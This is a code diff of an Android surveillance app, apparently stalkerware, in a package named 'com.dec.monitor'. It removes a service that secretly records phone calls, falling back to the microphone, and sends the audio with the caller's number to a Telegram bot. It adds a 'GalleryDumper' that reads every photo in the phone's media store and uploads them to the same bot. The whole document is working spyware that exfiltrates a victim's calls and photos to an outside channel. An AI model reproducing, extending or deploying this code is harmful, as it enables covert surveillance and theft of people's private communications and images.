@@ -1,100 +1,58 @@
-package com.dec.monitor.call
+package com.dec.monitor.media
 
-import android.app.*
-import android.content.Intent
-import android.media.MediaRecorder
-import android.os.Build
-import android.os.IBinder
-import android.util.Log
-import androidx.core.app.NotificationCompat
+import android.content.Context
+import android.provider.MediaStore
 import com.dec.monitor.TelegramBot
-import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import java.io.File
-import java.text.SimpleDateFormat
-import java.util.*
 
-class CallRecordingService : Service() {
+object GalleryDumper {
 
-    private var recorder: MediaRecorder? = null
-    private var outputFile: File? = null
-    private var callerNumber = "unknown"
-
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        callerNumber = intent?.getStringExtra("number") ?: "unknown"
-        startForeground(1, buildNotification())
-        startRecording()
-        return START_NOT_STICKY
-    }
-
-    private fun startRecording() {
-        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
-        outputFile = File(getExternalFilesDir(null), "call_${timestamp}.mp3")
-
-        recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            MediaRecorder(this)
-        } else {
-            @Suppress("DEPRECATION")
-            MediaRecorder()
-        }
-
-        recorder?.apply {
-            setAudioSource(MediaRecorder.AudioSource.VOICE_CALL)
-            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-            setAudioSamplingRate(44100)
-            setAudioEncodingBitRate(128000)
-            setOutputFile(outputFile?.absolutePath)
-            try {
-                prepare()
-                start()
-                Log.d("CallRecorder", "Recording started: ${outputFile?.name}")
-            } catch (e: Exception) {
-                Log.e("CallRecorder", "Recording failed: ${e.message}")
-                // fallback: try MIC source (works on some devices where VOICE_CALL is restricted)
-                reset()
-                setAudioSource(MediaRecorder.AudioSource.MIC)
-                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                setOutputFile(outputFile?.absolutePath)
-                try { prepare(); start() } catch (e2: Exception) {
-                    Log.e("CallRecorder", "MIC fallback also failed: ${e2.message}")
-                }
-            }
-        }
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
+    // count = -1 means full gallery
+    suspend fun sendLatest(context: Context, count: Int) = withContext(Dispatchers.IO) {
         try {
-            recorder?.stop()
-            recorder?.release()
-        } catch (e: Exception) {
-            Log.e("CallRecorder", "Stop error: ${e.message}")
-        }
-        recorder = null
+            val projection = arrayOf(
+                MediaStore.Images.Media.DATA,
+                MediaStore.Images.Media.DISPLAY_NAME,
+                MediaStore.Images.Media.DATE_ADDED
+            )
 
-        outputFile?.let { file ->
-            if (file.exists() && file.length() > 0) {
-                CoroutineScope(Dispatchers.IO).launch {
-                    TelegramBot.sendAudio(file, "🎙 Call recording\nNumber: $callerNumber")
+            val cursor = context.contentResolver.query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                projection,
+                null, null,
+                "${MediaStore.Images.Media.DATE_ADDED} DESC"
+            )
+
+            val total = cursor?.count ?: 0
+            val limit = when {
+                count == -1 -> total
+                count == -2 -> total / 2
+                else -> count
+            }
+
+            TelegramBot.sendMessage("🖼 Sending $limit of $total photos...")
+
+            var sent = 0
+            cursor?.use { c ->
+                while (c.moveToNext() && sent < limit) {
+                    val path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
+                    val name = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
+                    val file = File(path)
+                    if (file.exists()) {
+                        val copy = File(context.cacheDir, "g_$name")
+                        file.copyTo(copy, overwrite = true)
+                        TelegramBot.sendPhoto(copy, "🖼 $name")
+                        sent++
+                    }
                 }
             }
+
+            TelegramBot.sendMessage("✅ Gallery dump complete — $sent photos sent")
+
+        } catch (e: Exception) {
+            TelegramBot.sendMessage("🖼 Gallery error: ${e.message}")
         }
     }
-
-    private fun buildNotification(): Notification {
-        val channelId = "call_recorder"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(channelId, "Call Recorder", NotificationManager.IMPORTANCE_LOW)
-            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
-        }
-        return NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Recording call...")
-            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
-            .build()
-    }
-
-    override fun onBind(intent: Intent?): IBinder? = null
 }
